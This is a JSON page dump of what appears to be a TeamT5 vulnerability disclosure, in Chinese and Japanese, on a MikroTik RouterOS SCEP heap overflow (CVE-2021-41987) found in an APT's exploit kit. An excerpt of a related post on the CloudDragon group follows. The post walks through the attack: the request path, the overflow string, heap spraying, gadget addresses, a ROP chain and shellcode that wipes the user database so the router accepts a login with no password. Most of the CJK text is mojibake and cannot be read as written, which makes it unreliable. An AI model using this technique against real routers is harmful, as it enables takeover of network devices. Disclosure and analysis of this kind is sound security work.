ä¸çè³æè¢«è¦èçåé¡ã\n\n### æ¼æ´å©ç¨\nééåæ exploit code æåå¯ä»¥ç¼ç¾ï¼æ»æèä½¿ç¨ä¸è¿°æ¼æ´å° bins ä¸­çæå chunk size æ¹å¤§ (0x4121)ï¼ä¹å¾åæ¬¡ malloc å°ææ¿å°éåéå¤§ç chunk å±æä¾¿å¯ä»¥è¦å¯« heap ä¸çå§å®¹ã\n\nè¦èæå destructor ä¸­æç¨å°ç vtable pointerï¼å° ```edx``` æ¹æ ```0x8061a74``` ä½¿å¾ ```call [edx+4]``` å·è¡ä½æ¼ ```0x8058e89``` ç gadget (```xchg eax, ebp; ret;```)ã\n\n![Mikrotik 2.png](https://uploads.teamt5.org/upload/original/pic2_vulnerability-mikrotik-cve-2021-41987.png)\n\n#### å å´ç\né¦åç¼èµ· 64 åè«æ±å heap spray å°æåè¦ç gadget è shellcode é¨èé£ç·è«æ±çå° heap ä¸ï¼ä¸¦å°å¶ä¸­ä¸äºé£ç·ééä¾è® heap chunk å¯ä»¥è¢« overflow è¦èå° vtable pointerã\n\n![Mikrotik 3.png](https://uploads.teamt5.org/upload/original/pic3_vulnerability-mikrotik-cve-2021-41987.png)\n\néè£¡ç¨å°ç function ```aaaa``` æå°å¾çºæéè¦ç ROP gadgets çµåèµ·ä¾ï¼function ä¸­çè®æ¸ ```sc``` è¡¨ç¤ºå¾é¢æè¢«å·è¡å°ç shellcodeã\n\n![Mikrotik 4.png](https://uploads.teamt5.org/upload/original/pic4_vulnerability-mikrotik-cve-2021-41987.png)\n\n#### è§¸ç¼å æº¢åº\nééå¼å« function ```bbbb``` æå°æåç payload ä½¿ç¨åé¢æéçåå¼éåºç¨ä»¥è§¸ç¼ heap overflowã\n\n![Mikrotik 5.png](https://uploads.teamt5.org/upload/original/pic5_vulnerability-mikrotik-cve-2021-41987.png)\n![Mikrotik 6.png](https://uploads.teamt5.org/upload/original/pic6_vulnerability-mikrotik-cve-2021-41987.png)\n\nå¨ function ä¸­çåæ¸ message ```'x'*801*4+'hCE'```ï¼æå¨ base64 è§£ç·¨ç¢¼çåæç±æ¼åè¿°çè¨ç®é¯èª¤ï¼å°å°è´ä¸ä¸å chunk ç size æåå¥½è¢«è¦èå°ã\n![Mikrotik 7.png](https://uploads.teamt5.org/upload/original/pic7_vulnerability-mikrotik-cve-2021-41987.png)\n\n\n#### åè©¦éæ°åå¾è¢«è¦èå° size ç chunk\nå¾çºééç¹¼çºæ°å¢è«æ±çæ¹å¼ï¼åè©¦åå¾è¢«æ¹å¤§ç chunkï¼overflow çå§å®¹å¯ä»¥æ¹å°å¨ vtable è£¡ç pointerã\n\n![Mikrotik 8.png](https://uploads.teamt5.org/upload/original/pic8_vulnerability-mikrotik-cve-2021-41987.png)\n\n\nå¨ ```i=3``` æï¼æè® ```edx``` çå¼æ¹æ ```0x8061a74```ã\n![Mikrotik 9.png](https://uploads.teamt5.org/upload/original/pic9_vulnerability-mikrotik-cve-2021-41987.png)\n\n\n#### è§¸ç¼ destructor\n\næå¾ééééé£ç·çæ¹å¼ï¼è§¸ç¼ destructor ```call [edx+4]```\n![Mikrotik 10.png](https://uploads.teamt5.org/upload/original/pic10_vulnerability-mikrotik-cve-2021-41987.png)\n\n\n#### å¹¸éçæ\nç±æ¼ä¸éå§ç heap sprayï¼```0x8061a74``` æè®ææåä¸é£ç·æå¡«å¥çå§å®¹ï¼å æ­¤ ```call [edx+4]``` æè®æå¼å« ```0x8058e89```ã\n\n![Mikrotik 11.png](https://uploads.teamt5.org/upload/original/pic11_vulnerability-mikrotik-cve-2021-41987.png)\n\n\nä¸æ¦æåé²å° ROP gadgetï¼éå ROP chainï¼æå° ```open@got``` æ¹æ ```mprotect```ï¼ä½¿ç¨ gadgetsï¼åè©¦æ ```open``` è®æ ```mprotect```ã\n\n![Mikrotik 12.png](https://uploads.teamt5.org/upload/original/pic12_vulnerability-mikrotik-cve-2021-41987.png)\n\n\n\n```0x804fc04: pop esp; ret;``` ææ ```esp``` æ¹æ 0x8061a74+8ï¼æ¥åå®æ´ ROP chainã æå¾å¼å« ```mprotect``` ä½¿å·è¡æµé²å° shellcode (```0x8061674```) ä¸å·è¡ã\n\nè©²ä»½ exploit ä¸­ shellcode çå§å®¹çºï¼```unlink('/nova/store/user.dat') + sync() + reboot()```ã ç­å¾éæ°ååä¹å¾å¯ä»¥ç¼ç¾ Web ä»é¢å¯ä»¥ä¸ä½¿ç¨å¯ç¢¼ç´æ¥ç»å¥ã\n\n### çµè«\nééä¸é¢çåæå¯ä»¥ç¼ç¾éåæ»æç¨å¼ç¢¼(exploit)æå¹¾åä¾·éæ§ï¼\n\n**1. ç©©å®æ§è¼ä½**\n- ç±æ¼ ```add()``` æ²æèçé²ä½ï¼åæ ASLR çç·£æï¼éæ°£ä¸å¥½çè©±å°ç´æ¥å°è´æ»æå¤±æã\n- å¨åè©¦éç¾çéç¨ä¸­æåä¹ç¼ç¾å°ï¼ææå shellcode å·²ç¶æ­£å¸¸å·è¡ (```/nova/store/user.dat``` å·²ç¶è¢«åªé¤)ï¼å»æªå¦é æè¬éæ°ååï¼éé¨åéè¦æ¹é² shellcode ä¾å¢å æåæ©çã\n- å¨åè©¦éç¾çåæï¼æåä¹è©¦åééä¿®æ¹ exploit å shellcode ä¾å¢å å¶ç©©å®æ§ï¼ä½æå¾æåçä»åªæç´ç¥çº 5~6%ã\n- å¯ä¸å¼å¾æ¶å¹¸çæ¯ï¼åè¥æ»æå¤±æä¹åªæ¯æé æ ```www``` crash å¾è¢« watchdog éæ°ååï¼ä¸¦ä¸æå°ä½¿ç¨ä¸é æå¤ªå¤§å°æ¾ææ¯å¼èµ·ä½¿ç¨èæ³¨æã\n\n**2. æ»æåæå´æ ¼**\n\nå¦æ ¹å æè¿°ï¼```scep_server_name``` é çºå·²ç¥ï¼è¥æ²æéå path åºæ¬ä¸ä¹ç¡æ³é²è¡æ»æã\n\n**3. åå ±æéè»¸**\n\n- ```2021/07/11```: å¨ C2 ç¼ç¾ exploit code\n- ```2021/10/04```: åå ±çµ¦ Mikrotik å®æ¹, ä¿çç·¨è CVE-2021-41987\n- ```2021/11/17```: Mikrotik å®æ¹éåºæ´æ°ä¿®æ­£è©²å¼±é»\n- ```2022/03/01```: å¬é CVE-2021-41987 ç¸éç´°ç¯\n\n**4. RouterOS åå½±é¿çæ¬**\n\n- ```6.46.8```\n- ```6.47.9```\n- ```6.47.10```\n\n### éæ¼ TeamT5 D39 æ¼æ´ç ç©¶åé\nD39 è´åæ¼å¼±é»å®å¨èæ¼æ´ææé åï¼ç ç©¶ç¯ååå« MobileãIOTãLinuxãWindows ç­ææ©æé£ç¶²çç³»çµ±èè£ç½®é½æ¯æåçç®æ¨ï¼ç¬ï¼ï¼åéææå¤é éå¤§ï¼Criticalï¼æéè¦ï¼Importantï¼ä¹å®å¨æ¼æ´ï¼ä¸¦æ¼ BlackhatãHITCONãPOC ç­åéæè­°æä»»è¬èã\n\næ»æç¨å¼ç¢¼(exploit)ç ç©¶ä¸ç´æ¯ç¶²è·¯æ»é²è£¡é¢æé«æ·±çæè¡ä¹ä¸ï¼TeamT5 æè¨±æå¥è³æºä¾å¹é¤æ´å¤äººæé²å¥éåé åï¼æå¾å°ç£è½æè¶ä¾è¶å¤ä¸çé å°çå¼±é»ç ç©¶äººæãæ­¡è¿åæ¼é¢å°æªç¥ææ°ï¼è´åæ¼æ¼æ´ç ç©¶ãææçºç®æ¨ï¼ä¸¦å·æç¨ç«ç ç©¶è½åèä¸åå å¥æå ð¤\n\n### åè\n- https://wiki.mikrotik.com/wiki/Manual:System/Certificates\n- https://en.wikipedia.org/wiki/Base64\n\n*é¦åä¾æº: Pixabay","__typename":"ComponentPostPostContext"},{"id":"165","locale":"jp","title":"Mikrotik èå¼±æ§ã®éç¤ºã¨å±åºï¼CVE-2021-41987ï¼","context":"## ã¯ããã«\nAPTã®ããã«ã¼çµç¹Huapiã¯ã2007å¹´ããæ´»åãéå§ãã10å¹´ä»¥ä¸å°æ¹¾ã«æ»æãä»æãã¦ãã¾ããTeamT5ã¯ãHuapiãéçºãããã«ã¦ã§ã¢ã«ã¤ãã¦ãç ç©¶å¡ã®è§£æãé²ãããã«ããã­ã³ã°ããã¦ãããã¨ããããéå¸¸ã¯å¤æ´ãããRC4ã®ã¢ã«ã´ãªãºã ã§æå·åãã¦éä¿¡ããããã¨ãç¢ºèªãã¾ãããHuapiã¯é·æã«ãããæ¿åºããã¤ãã¯ãé»æ°éä¿¡ãç ç©¶ãã·ã³ã¯ã¿ã³ã¯æ©é¢ãæ»æãã¦ãããTeamT5ã®çµ±è¨ã§ã¯ãè¢«å®³èã®50%ä»¥ä¸ãæ¿åºæ©é¢ã¨ãªã£ã¦ãã¾ããå°æ¹¾ãã¢ã¡ãªã«ãæ¥æ¬ãéå½ãªã©ãè¢«å®³ãåãã¦ãããå¤ãã®ä¾µå¥ãæ»æãå°æ¹¾ã®æ¿åºæ©é¢ãçã£ããã®ã§ãããã¨ãç¢ºèªããã¾ããã\n\né·æçãªè¿½è·¡ã¨è¦³å¯ã«ãããå½ç¤¾ã¯C\u0026Cãµã¼ãã§ã®å¬éãã£ã¬ã¯ããªã«Mikrotik SCEPãµã¼ãã¹ãå¯¾è±¡ã¨ãã0dayã¨ã¯ã¹ãã­ã¤ãä¸å¼ãå«ã¾ãã¦ãããã¨ãçºè¦ãã¾ãããèå¼±æ§ã®å­å¨ãç¢ºèªããå¾ãå½ç¤¾ã¯èå¼±æ§ãçºçããåå ãMikrotikã«å ±åãã¾ãããããã«ãããç´ã¡ã«ä¿®æ­£ããããéçºãããã®èå¼±æ§ãå©ç¨ããç¶ç¶çãªãã«ã¦ã§ã¢ã®æ»æãé²ããã¨ãã§ãã¾ããã\n\nMikrotikã¯ã2021å¹´11æ17ã«å¬å¼ã®ä¿®æ­£ãã¼ã¸ã§ã³ãå¬éãã¦ãã¾ããå½±é¿ãåãããã¼ã¸ã§ã³ãä½¿ç¨ãã¦ããã¦ã¼ã¶ã¼ã¯ãè¢«å®³ãé¿ããããã«ã§ããã ãæ©ãã¢ãããã¼ããã¦ãã ãããå½ç¤¾ã¯ããã§æ»æãã­ã°ã©ã ã®è©³ç´°ã¨èå¼±æ§ãçã¾ããåçã®è©³ç´°ãæããã«ãã¾ããç®çã®ãããªãææ®µãé¸ã°ãªãAPTããã«ã¼çµç¹ã®ããæ¹ãè¦ã¦ã¿ã¾ãããã\n\n### æªæã®ããããã±ã¼ã¸ã®è§£æ\nMikrotik routerboardã¯ãå¼·åãªæ©è½æ§ã¨ç°¡ææ§ãåããã«ã¼ã¿ã¼ã¨ãã¦ãä»ã®ç«¯æ«è£ç½®ãå¿è¦ãªè¨¼ææ¸ãç°¡åã«åå¾ã§ãããããSCEPï¼Simple Certification Enrolling Protocolï¼ããµãã¼ããã¦ãã¾ãããã­ãã³ã«ã®ç¸äºä½ç¨ã«ããã¦ããã¹ã¦ã®ãã¤ããªãã¼ã¿ã¯base64ã¨ã³ã³ã¼ãå¾ã«éä¿¡ããã¾ãããMikrotik SCEPãµã¼ãã¹ã«ããbase64ãã³ã¼ãã®è¨ç®ã¨ã©ã¼ããHeap-based buffer overflowãå¼ãèµ·ããã¾ãã\n\nã¨ã¯ã¹ãã­ã¤ãï¼exploitï¼ã«ã¯ã3ã¤ã®ãã¼ã¸ã§ã³ãå¯¾è±¡ã¨ããexploit code```mikrotik-tile-6.46.8```ã```mikrotik-vm-64.8```ã```mikrotik-vm-6.48```ããã³æ»ææåå¾ã«ã³ãã³ãã¤ã³ã¸ã§ã¯ã·ã§ã³ãè¿½å ããããããã¼ã¸ã§ã³ã«å¿ããshellcodeãå«ã¾ãã¦ãã¾ãã\n\nä»¥ä¸ã¯ãå½ç¤¾ããã¼ã¸ã§ã³```mikrotik-vm-6.46.8```ã«å¯¾ãã¦è¡ã£ãexploitã®è§£æã§ãã\n\n### èå¼±æ§ã®æ ¹æ¬çãªåå \n\nã·ã³ãã«ãªHTTPãªã¯ã¨ã¹ãï¼\n\n ```GET /scep/{scep_server_name}?operation=PKIOperation\u0026message={} HTTP/1.1\\r\\n``` \n\n```www``` ã¨ããHTTPãµã¼ãã¹ãæãbinaryãç°¡åã«ç ´å£ããwatchdogã§åèµ·åãããã¨ãã§ãã¾ãã\n\nãªãã¼ã¹ã¨ã³ã¸ãã¢ãªã³ã°ã«ããã ```/nova/lib/www/scep.p``` ã® ```ScepRequest::parseRequest``` ãbase64ã¨ã³ã³ã¼ãã® ```message``` ãã©ã¡ã¼ã¿ããã³ã¼ãããæããã¼ã¿ã®é·ãã®è¨ç®ã«ã¨ã©ã¼ãçºçãããã¨ã§mallocã®å²ãå½ã¦ãä¸è¶³ããheap overflowãçºçãããã¨ãçºè¦ãã¾ããã\n\u003cbr\u003e\n![Mikrotik 1.png](https://uploads.teamt5.org/upload/original/pic1_vulnerability-mikrotik-cve-2021-41987.png)\n\u003cbr\u003e\n\n### Base64ãèå¼±æ§ã«ãªãã®ã¯ãä½ãã®ééãã§ã¯ãªãã\nä¾ãã°ã ```xxxxxxxxxxxxxxxxhCE``` ã¨ããé·ã19ã®ãã¼ã¿ãå¥åããå ´åããªãã¼ã¹ã¨ã³ã¸ãã¢ãªã³ã°å¾ã®ãã­ã°ã©ãã³ã°ã­ã¸ãã¯ã®è¦³ç¹ãããSCEPã¯ãã³ã¼ãå¾ã®é·ãã12ã¨ãã¦è¨ç®ãã¾ãã ``` out_len = 3 *ï¼in_len // 4ï¼``` ï¼ããã§ã®```//```ã¯æ´æ°ã®é¤æ³ã§ãï¼ãããããå®éã®ãã³ã¼ãå¾ã®ãã¼ã¿ã®é·ãã¯14ã§ããããheapã®ãã¼ã¿ãä¸æ¸ããããåé¡ã«ã¤ãªããã¾ãã\n\n### èå¼±æ§ã®å©ç¨\nå½ç¤¾ã¯ãexploit codeã®è§£æã«ãããæ»æèã¯ä¸è¨ã®èå¼±æ§ãå©ç¨ãã¦binsã®ç¹å®ã®chunk sizeãããå¤§ããªãµã¤ãºã®ï¼0x4121ï¼ã«å¤æ´ããç¶ãã¦mallocãå¤§ãããªã£ãchunkãåå¾ããæã«heapã®åå®¹ãä¸æ¸ããããã¨ãçºè¦ãã¾ããã\n\nç¹å®ã®destructorã§ä½¿ç¨ãããvtable pointerãä¸æ¸ããã¦ ```edx``` ã ```0x8061a74``` ã«å¤æ´ãã ```call [edx+4]``` ã ```0x8058e89``` ã®gadgetãå®è¡ããããã«ãã¾ãï¼ ```xchg eax, ebp; ret;``` ï¼ã\n\u003cbr\u003e\n![Mikrotik 2.png](https://uploads.teamt5.org/upload/original/pic2_vulnerability-mikrotik-cve-2021-41987.png)\n\u003cbr\u003e\n#### ãã¼ãã¹ãã¬ã¼\nã¯ããã«ã64ã®heap sprayããªã¯ã¨ã¹ãããæ¥ç¶ãªã¯ã¨ã¹ãã¨åæã«å¿è¦ãªgadgetã¨shellcodeãheapã«ã¹ãã¬ã¼ãã¾ããheap chunkã®overflowã«ãã£ã¦vtable pointerãä¸æ¸ããããããã«ä¸é¨ã®æ¥ç¶ã¯éãããã¾ãã\n\u003cbr\u003e\n![Mikrotik 3.png](https://uploads.teamt5.org/upload/original/pic3_vulnerability-mikrotik-cve-2021-41987.png)\n\u003cbr\u003e\nããã§ä½¿ç¨ãããfunction ```aaaa``` ã¯ãå¾ã§å¿è¦ã¨ãªãROP gadgetsãçµã¿åããã¾ããfunctionã®å¤æ°```sc```ã¯ãå¾ã§å®è¡ãããshellcodeãç¤ºãã¦ãã¾ãã\n\u003cbr\u003e\n![Mikrotik 4.png](https://uploads.teamt5.org/upload/original/pic4_vulnerability-mikrotik-cve-2021-41987.png)\n\u003cbr\u003e\n#### ãã¼ããªã¼ãã¼ãã­ã¼ã®ããªã¬ã¼\nfunction ```bbbb``` ãå¼ã³åºãã¨ãåè¿°ã®ãã¿ã¼ã³ã§heap overflowãããªã¬ã¼ããå½ç¤¾ã®payloadãéä¿¡ããã¾ãã\n\u003cbr\u003e\n![Mikrotik 5.png](https://uploads.teamt5.org/upload/original/pic5_vulnerability-mikrotik-cve-2021-41987.png)\n![Mikrotik 6.png](https://uploads.teamt5.org/upload/original/pic6_vulnerability-mikrotik-cve-2021-41987.png)\n\u003cbr\u003e\nfunctionã®ãã©ã¡ã¼ã¿ message ```'x'*801*4+'hCE'``` ã¯ãbase64ãã³ã¼ãã¨åæã«åè¿°ã®è¨ç®ã¨ã©ã¼ã«ãããæ¬¡ã®chunkã®sizeãã¡ããã©ä¸æ¸ãããã¾ãã\n\u003cbr\u003e\n![Mikrotik 7.png](https://uploads.teamt5.org/upload/original/pic7_vulnerability-mikrotik-cve-2021-41987.png)\n\u003cbr\u003e\n\n#### sizeãä¸æ¸ããããchunkã®ååå¾ãè©¦ã¿ã\nç¶ãã¦ããªã¯ã¨ã¹ããè¿½å ãç¶ãããµã¤ãºãå¤§ãããããchunkã®åå¾ãè©¦ã¿ããã¨ã§ãoverflowã®åå®¹ãvtableã®pointerã«å¤æ´ãããã¨ãã§ãã¾ãã\n\u003cbr\u003e\n![Mikrotik 8.png](https://uploads.teamt5.org/upload/original/pic8_vulnerability-mikrotik-cve-2021-41987.png)\n\u003cbr\u003e\n\n```i=3``` ã®æã ```edx``` ã®å¤ã ```0x8061a74``` ã«ãªãã¾ãã\n\u003cbr\u003e\n![Mikrotik 9.png](https://uploads.teamt5.org/upload/original/pic9_vulnerability-mikrotik-cve-2021-41987.png)\n\u003cbr\u003e\n\n#### destructorã®ããªã¬ã¼ \n\n\næå¾ã«æ¥ç¶ãéãããã¨ã§ãdestructor ```call [edx+4]```ãããªã¬ã¼ãã¾ãã\n![Mikrotik 10.png](https://uploads.teamt5.org/upload/original/pic10_vulnerability-mikrotik-cve-2021-41987.png)\n\n\n#### å¹¸éãç¥ã\næåã®heap sprayã«ããã ```0x8061a74``` ã®ãã¼ã¿ã¢ãã¬ã¹ãå¤æ´ãããããã ```call [edx+4]``` ã ```0x8058e89``` ãå¼ã³åºãããã«ãªãã¾ãã\n\u003cbr\u003e\n![Mikrotik 11.png](https://uploads.teamt5.org/upload/original/pic11_vulnerability-mikrotik-cve-2021-41987.png)\n\u003cbr\u003e\n\nROP gadgetã¸ã®ã¢ã¯ã»ã¹ãä¸åº¦æåããã¨ããã®ROP chainã ```open@got``` ã ```mprotect``` ã«å¤æ´ããgadgetsãä½¿ç¨ãã¦ ```open``` ã ```mprotect``` ã«å¤æ´ãããã¨ãã¾ãã\n\n![Mikrotik 12.png](https://uploads.teamt5.org/upload/original/pic12_vulnerability-mikrotik-cve-2021-41987.png)\n\n\n\n```0x804fc04: pop esp; ret;``` ã¯ ```esp``` ã0x8061a74+8ã«å¤æ´ããå®å¨ãªROP chainã«åæ¥ç¶ãã¾ãã æå¾ã« ```mprotect``` ãå¼ã³åºããshellcode ( ```0x8061674``` )ã«ã¸ã£ã³ããã¦å®è¡ãã¾ãã\n\nãã®exploitã®shellcodeã®åå®¹ã¯ã ```unlink('/nova/store/user.dat') + sync() + reboot()``` ã§ãã åèµ·åå¾ãWebã¤ã³ã¿ã¼ãã§ã¼ã¹ã§ãã¹ã¯ã¼ããä½¿ããªãã¦ãã­ã°ã¤ã³ã§ãããã¨ãç¢ºèªã§ãã¾ãã\n\n\n### çµè«\nä¸è¨ã®è§£æã«ããããã®ã¨ã¯ã¹ãã­ã¤ãï¼exploitï¼ã«ã¯ãããã¤ãã®å¶éããããã¨ãç¢ºèªãã¾ããï¼\n\n**1. å®å®æ§ãä½ã**\n- ```add()``` ã¯ãããä¸ãæ°ãå¦çãããASLRããããã¨ãããéãæªããã°æ»æã®å¤±æã«ç´æ¥ã¤ãªããã¾ãã\n- åç¾ãè©¦ã¿ãéç¨ã§ãå½ç¤¾ãshellcodeãæ­£å¸¸ã«å®è¡ããã¦ããã«ãé¢ãããï¼ ```/nova/store/user.dat``` ãåé¤ããã¦ããï¼ãäºæ³éãã«åèµ·åããªããã¨ããããã¨ãçºè¦ãã¾ããããã®é¨åã«ã¤ãã¦ã¯ãshellcodeãæ¹è¯ãã¦æåçãä¸ããå¿è¦ãããã¾ãã\n- åç¾ãè©¦ã¿ãªãããå½ç¤¾ãexploitã¨shellcodeã®ä¿®æ­£ã«ããå®å®æ§ãé«ãããã¨ãã¾ããããæçµçãªæåçã¯ç´5ï½6%ã«ããã¾ããã§ããã\n- å¯ä¸å¹¸ãã ã£ãã®ã¯ãæ»æãå¤±æãã¦ã ```www``` ãcrashãã¦watchdogãåèµ·åãããã ãã§ãä½¿ç¨ä¸ã«å¤§ããªåé¡ã¯ãªããã¦ã¼ã¶ã¼ã®ç®ã«ã¤ããã¨ããªãã¨ããç¹ã§ãã\n\n\n**2. æ»æã®ããã®å³ããåææ¡ä»¶**\n\næ ¹æ¬çãªåå ã¨ãã¦è¿°ã¹ãããã«ã ```scep_server_name``` ãèªè­ãã¦ããå¿è¦ãããããã®pathããªããã°ãåºæ¬çã«æ»æãããã¨ã¯ã§ãã¾ããã\n\n**3. éç¤ºã®ã¿ã¤ã ã©ã¤ã³**\n\n- ```2021/07/11``` : C2ã§exploit codeãçºè¦\n- ```2021/10/04``` : Mikrotikã«å ±åãè­å¥çªå·CVE-2021-41987ãäºç´\n- ```2021/11/17``` : Mikrotikããã®èå¼±æ§ãä¿®æ­£ããã¢ãããã¼ããå¬é\n- ```2022/03/01``` : CVE-2021-41987ã«é¢ããè©³ç´°ãéç¤º\n\n**4. å½±é¿ãåããRouterOSã®ãã¼ã¸ã§ã³**\n\n- ```6.46.8``` \n- ```6.47.9``` \n- ```6.47.10``` \n\n### TeamT5 D39èå¼±æ§ç ç©¶ãã¼ã ã«ã¤ãã¦\nD39ã¯èå¼±æ§ã®ã»ã­ã¥ãªãã£ã¨èå¼±æ§ã®çºæã«åãçµãã§ãããç ç©¶ç¯å²ã«ã¯ãMobileãIOTãLinuxãWindowsãªã©ãã¤ã³ã¿ã¼ãããã«æ¥ç¶ãããã·ã¹ãã ãããã¤ã¹ã®ãã¹ã¦ãå«ã¾ãã¾ããéå¤§ï¼Criticalï¼ã¾ãã¯éè¦ï¼Importantï¼ãªã»ã­ã¥ãªãã£èå¼±æ§ã«é¢ããè±å¯ãªçµé¨ãæããBlackhatãHITCONãPOCãªã©å½éçãªã«ã³ãã¡ã¬ã³ã¹ã§è¬æ¼ãè¡ã£ã¦ãã¾ãã\n\nã¨ã¯ã¹ãã­ã¤ãï¼exploitï¼ã®ç ç©¶ã¯å¸¸ã«ã¤ã³ã¿ã¼ãããã®æ»é²ã«ãããæåç«¯æè¡ã®ä¸ã¤ã¨ãªã£ã¦ãããTeamT5ã¯ãå°æ¹¾ã«ããã¦ä¸çãããã¯ã©ã¹ã®èå¼±æ§ç ç©¶èãã¾ãã¾ãå¤ããªããã¨ãç®æããããå¤ãã®äººæãè²æããããã«ãªã½ã¼ã¹ãæå¥ãã¦ãã¾ããå½ç¤¾ã¯ãåæ°ãæã£ã¦æªç¥ã®ææ¦ã«ç«ã¡åãããèå¼±æ§ã®ç ç©¶ãçºè¦ã¨ããç®æ¨ã«åãã£ã¦åãæ³¨ãç¬èªã®ç ç©¶è½åãåããäººãã®åå ããå¾ã¡ãã¦ãã¾ãã ð¤\n\n### åèæç®\n- https://wiki.mikrotik.com/wiki/Manual:System/Certificates\n- https://en.wikipedia.org/wiki/Base64\n\n*ç»åã®ã½ã¼ã¹: Pixabay","__typename":"ComponentPostPostContext"}],"publishedAt":"2022-04-05T03:14:31.571Z","publish_date":"2022-03-01T12:00:00.000Z","createdAt":"2022-03-01T15:16:15.483Z","updatedAt":"2024-12-13T08:29:36.901Z","banner_img_url":"https://uploads.teamt5.org/upload/original/mikrotik_banner_lava.jpg","thumb_img_url":null,"post_name":"Mikrotik æ¼æ´æ­é²èéå ± (CVE-2021-41987)","post_url":"vulnerability-mikrotik-cve-2021-41987","enable_form":false,"attachment_id":null,"attachment_folder_id":null,"top_order":null,"__typename":"Post","tags":[{"id":"30","name":"vulnerability research ","createdAt":"2020-06-01T10:28:05.155Z","updatedAt":"2020-06-01T10:28:05.155Z","__typename":"Tag"}],"topic":{"id":"1","name":"Technical Analysis","category":"blogs","color":"#64cda2","contents":[{"id":"1","text":"Technical Analysis","locale":"en","__typename":"ComponentTopicsTopicContent"},{"id":"3","text":"æè¡åæ","locale":"tw","__typename":"ComponentTopicsTopicContent"},{"id":"5","text":"æè¡åæ","locale":"jp","__typename":"ComponentTopicsTopicContent"}],"__typename":"Topic"},"author":{"id":"6","email":"d39@example.com","username":"D39","__typename":"UsersPermissionsUser"},"relative_posts":[{"contents":[{"id":"58","locale":"en","title":"Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities","context":"The North Korean APT group CloudDragon, also known as Kimsuky, continues to target South Korean governments and organizations. TeamT5 has been actively monitoring this threat actor and we recently discovered CloudDragon abusing VPN zero-day vulnerability to launch a new attack against South Korean entities.\n\n## TeamT5's Vulnerability Research Results\n\nTeamT5 recently discovered two malicious samples circulating in South Korea, and both samples are installers of a newly identified backdoor which we named MemzipRAT. With further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc. \n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities recently, including Korean government agencies. According to TeamT5âs threat intelligence, we hold high confidence that the above malware to be follow-up attacks of the disclosed attack campaign conducted by CloudDragon. As the exploitation starts from a popular VPN system, these campaigns might lead to massive attacks and damage in the near future. And TeamT5 will keep taking careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n\u003cbr\u003e\n\n*Image courtesy of [Pixabay](https://pixabay.com/illustrations/north-korea-dprk-korea-juche-asia-1151137/)\n","__typename":"ComponentPostPostContext"},{"id":"59","locale":"tw","title":"åéé§­å®¢çµç¹åæ¬¡å©ç¨ VPN é¶æå·®æ¼æ´å°åéèªå¤ªç¢æ¥­ç¼åæ»æ","context":"åé APT æ»ææç¾¤ CloudDragonï¼ååçº Kimsukyï¼æçºéå°åéæ¿åºèçµç¹ç¼åæ»æã TeamT5 é·ææçºéæ³¨æ­¤é§­å®¢æç¾¤ï¼ç¼ç¾ CloudDragon è¿æå©ç¨ VPN é¶æå·®æ¼æ´ï¼zero-day vulnerabilityï¼å°åéç¼åå¦ä¸æ³¢æ°çæ»æã\n\n## TeamT5 æ¼æ´ç ç©¶çµæ\n\næ ¹æ TeamT5 è¿æç ç©¶ï¼æåç¼ç¾äºå©åæ»æåéçæ¡æç¨å¼æ¨£æ¬ï¼èæåææ°ç¼ç¾çå¾éç¨å¼ MemzipRAT æé«åº¦éè¯ï¼ççºå¶å®è£ç¨å¼ãæåæ¨æ¸¬éä¸æ³¢æ»ææ¯éå°åéæèªå¤ªç¢æ¥­å¬å¸èä¾ï¼è©²åé§­å¬å¸çºåéååå¤§ä¼æ¥­ä¹ä¸ï¼æ¥­åç¯åæ¶µèèªå¤ªãåå­¸ãéèãIT æåç­ãæ»æèå©ç¨ä¸å°æªæ­é²ç  VPN ä¼ºæå¨æ¼æ´ï¼é§­é²ç®æ¨ç°å¢ä¸¦é¨ç½²æ¡æç¨å¼ã\n\næè¿å¤èµ·éå°éåçæ»æï¼åæ¬åéæ¿åºç ç©¶å®ä½åé§­ï¼ä¹çä¼¼çº CloudDragon éé VPN æåæ¼æ´å±éçå¥ä¾µè¡åãæ ¹æ TeamT5 ææ¡çç¸éæè³ï¼æåæé«åº¦ä¿¡å¿èªçºï¼éæ¬¡æ»æä½¿ç¨çæ°å¾éç¨å¼çº CloudDragon VPN æ»æçå¾çºå©ç¨ãæåæ¨æ¸¬ï¼æ»æèå°æçºå©ç¨æ­¤ç¥å VPN ç³»çµ±æ¼æ´ï¼ç¼åæ´å¤§åãæå®³æ´å´éçæ»æï¼æªä¾ä¹ä¸æé¤è½è®çºä¾æéæ»æçå¯è½ã\n\n\u003cbr\u003e\n\n*åçä¾æºï¼[Pixabay](https://pixabay.com/illustrations/north-korea-dprk-korea-juche-asia-1151137/)","__typename":"ComponentPostPostContext"}],"publishedAt":"2022-04-05T03:14:30.018Z","publish_date":"2021-07-01T10:00:00.000Z","createdAt":"2021-06-30T11:51:18.736Z","updatedAt":"2022-05-06T09:14:34.007Z","banner_img_url":"https://legacy-uploads.teamt5.org/north_korea_1151137_1920_0727509c9b.jpg","thumb_img_url":null,"post_name":"Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities","post_url":"another-clouddragon-attack-abusing-vpn-zero-day-vulnerability-to-target-south-korean-entities","enable_form":false,"attachment_id":null,"attachment_folder_id":null,"top_order":null,"__typename":"Post","tags":[{"id":"23","name":"supply chain attack","createdAt":"2020-05-28T17:48:45.048Z","updatedAt":"2020-05-28T17:54:04.229Z","__typename":"Tag"},{"id":"33","name":"cyber espionage","createdAt":"2020-06-19T09:18:40.849Z","updatedAt":"2020-06-19T09:18:40.849Z","__typename":"Tag"},{"id":"101","name":"CloudDragon","createdAt":"2021-05-11T17:38:28.264Z","updatedAt":"2021-05-11T17:38:28.274Z","__typename":"Tag"},{"id":"103","name":"South Korea","createdAt":"2021-06-29T13:36:19.782Z","updatedAt":"2021-06-29T13:36:19.791Z","__typename":"Tag"},{"id":"41","name":"cyber threat intelligence","createdAt":"2020-06-19T09:26:13.025Z","updatedAt":"2020-10-14T11:42:12.270Z","__typename":"Tag"},{"id":"124","name":"threat 